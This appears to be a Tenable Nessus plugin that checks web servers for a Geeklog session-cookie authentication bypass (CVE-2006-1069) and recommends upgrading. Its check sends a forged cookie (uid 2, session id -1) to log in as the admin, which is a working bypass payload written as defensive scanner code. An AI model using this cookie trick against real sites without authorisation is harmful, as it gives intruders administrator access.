#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
an authentication bypass issue. 

Description :

The remote host is running Geeklog, an open-source weblog powered by
PHP and MySQL. 

The version of Geeklog installed on the remote contains a flaw in its
session-handling library that can be exploited by an attacker to
bypass authentication and gain access as any user, including the
admin. 

See also :

http://www.geeklog.net/article.php/geeklog-1.4.0sr2

Solution :

Upgrade to Geeklog 1.3.9sr5 / 1.3.11sr5 / 1.4.0sr2 or later.

Risk factor : 

Medium / CVSS Base Score : 4.8
(AV:L/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21036);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1069");
  script_bugtraq_id(17010);

  script_name(english:"Geeklog session Cookie Authentication Bypass Vulnerability");
  script_summary(english:"Tries to bypass authentication in Geeklog");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/geeklog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  uid = 2;                             # Admin account.
  sessid = -1;                         # an impossible session id.

  req = http_get(item:string(dir, "/index.php"), port:port);
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      # nb: default cookie names for $_CONF['cookie_name']
      #     and $_CONF['cookie_session'].
      "Cookie: geeklog=", uid, "; gl_session=", sessid, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if we have been authenticated.
  if (string(dir, '/users.php?mode=logout">') >< res) {
    security_warning(port);
    exit(0);
  }
}
